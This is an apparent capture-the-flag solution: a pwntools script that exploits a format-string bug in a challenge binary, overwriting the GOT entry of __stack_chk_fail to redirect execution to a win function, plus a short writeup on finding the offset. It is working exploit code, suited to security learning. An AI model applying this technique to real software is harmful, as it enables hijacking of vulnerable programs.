from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

exe = ELF('./birdguard_patched_patched')

# p = process('./birdguard_patched_patched')
p = remote('birdguard.chals.eycc.2hwa.xyz', 31004)

offset = 6

writes = {
    exe.got['__stack_chk_fail']: exe.sym['win']
}

payload = fmtstr_payload(offset, writes)

payload = payload.ljust(120, b'A')

p.sendlineafter(b'payload: ', payload)

p.interactive()

"""
Fast writeup

Simply there is format string bug so i simply got the offset of my payload using

AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

When i send this i got that the "A"s at the 6th position in ascii

Then there is no protection on overwriting the GOT so simply overwriting the canary got to win func
"""
